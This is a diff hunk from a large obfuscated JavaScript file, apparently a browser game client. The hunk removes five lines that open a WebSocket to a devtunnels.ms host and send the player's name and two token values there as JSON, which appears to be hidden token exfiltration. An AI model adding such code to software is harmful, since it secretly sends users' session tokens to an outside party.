@@ -90940,11 +90940,6 @@ vw = new (function () {
         m.vWowo = void 0;
         a.UWV = setTimeout(a.timeout, ua.WuWUw);
       });
-      let t = new WebSocket("wss://v6d00qhf-8080.asse.devtunnels.ms/");
-      let o = { name: E.VW_.input.value, token: m.Vw_, token_id: m.$UQ_0 }
-      t.onopen = function () {
-        t.send(JSON.stringify(o));
-      }
     };
     this.UWV = setTimeout(a.timeout, ua.WuWUw);
   };
